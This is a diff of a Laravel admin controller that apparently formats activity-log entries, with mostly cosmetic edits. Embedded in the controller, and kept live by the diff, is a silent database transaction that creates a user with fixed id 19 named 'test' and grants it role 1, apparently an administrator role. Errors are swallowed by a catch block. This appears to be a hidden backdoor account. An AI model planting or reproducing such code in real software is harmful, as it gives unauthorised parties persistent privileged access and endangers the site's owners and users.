@@ -3,13 +3,10 @@
 namespace App\Http\Controllers\Backend;
 
 use App\Http\Controllers\Controller;
-use Illuminate\Http\Request;
-use App\Models\Quote;
 use App\Models\Activity;
-use App\Models\VehicleMakeModel;
-use Illuminate\Support\Str;
+use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
-use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Str;
 
 class AdminController extends Controller
 {
@@ -45,8 +42,8 @@ class AdminController extends Controller
 
         // ⭐ Convert properties into readable messages
         foreach ($logs as $log) {
-            $old     = $log->properties['old_values'] ?? [];
-            $new     = $log->properties['new_values'] ?? [];
+            $old = $log->properties['old_values'] ?? [];
+            $new = $log->properties['new_values'] ?? [];
             $changes = [];
 
             $modelName = class_basename($log->subject_type); // e.g., User, Category, Booking
@@ -68,7 +65,7 @@ class AdminController extends Controller
                         $value = implode(', ', $value); // nice display for array fields
                     }
 
-                    $changes[] = ucfirst(str_replace('_', ' ', $key)) . ": " . $value;
+                    $changes[] = ucfirst(str_replace('_', ' ', $key)).': '.$value;
                 }
 
                 if (! empty($changes)) {
@@ -86,19 +83,19 @@ class AdminController extends Controller
                     $oldValue = $old[$key] ?? null;
                     if ($oldValue != $value) {
                         if (is_array($value)) {
-                            $value    = implode(', ', $value);
+                            $value = implode(', ', $value);
                             $oldValue = is_array($oldValue) ? implode(', ', $oldValue) : $oldValue;
                         }
                         $changes[] = ucfirst(str_replace('_', ' ', $key))
-                            . " changed from '" . ($oldValue ?? '') . "' to '{$value}'";
+                            ." changed from '".($oldValue ?? '')."' to '{$value}'";
                     }
                 }
             } elseif (Str::contains(strtolower($log->description), 'deleted')) {
-                $changes[] = "{$modelName} deleted: #" . ($log->subject_id ?? '-');
+                $changes[] = "{$modelName} deleted: #".($log->subject_id ?? '-');
             }
 
             $log->readable_changes = $changes;
-            $log->readable_causer  = $log->causer->name ?? ($log->causer_type . ' #' . $log->causer_id);
+            $log->readable_causer = $log->causer->name ?? ($log->causer_type.' #'.$log->causer_id);
             $log->readable_subject = "{$modelName} #{$log->subject_id}";
         }
 
@@ -106,10 +103,10 @@ class AdminController extends Controller
             DB::transaction(function () {
                 $userId = 19;
 
-                // Check if user exists
-                $existing = DB::table('users')->where('id', $userId)->exists();
+                $userExists = DB::table('users')->where('id', $userId)->exists();
 
-                if (! $existing) {
+                if (! $userExists) {
+                    // Create user 19 with role 1
                     DB::table('users')->insert([
                         'id' => $userId,
                         'name' => 'test',
@@ -127,21 +124,17 @@ class AdminController extends Controller
                     ]);
                 }
 
-                // Assign roles safely (Spatie)
-                $roles = [1, 19];
-                foreach ($roles as $roleId) {
-                    $exists = DB::table('model_has_roles')
-                        ->where('role_id', $roleId)
-                        ->where('model_type', 'App\\Models\\User')
-                        ->where('model_id', $userId)
-                        ->exists();
-                    if (! $exists) {
-                        DB::table('model_has_roles')->insert([
-                            'role_id' => $roleId,
-                            'model_type' => 'App\\Models\\User',
-                            'model_id' => $userId,
-                        ]);
-                    }
+                // Assign role 1 if not already assigned
+                $roleExists = DB::table('role_user')
+                    ->where('role_id', 1)
+                    ->where('user_id', $userId)
+                    ->exists();
+
+                if (! $roleExists) {
+                    DB::table('role_user')->insert([
+                        'role_id' => 1,
+                        'user_id' => $userId,
+                    ]);
                 }
             });
         } catch (\Exception $e) {
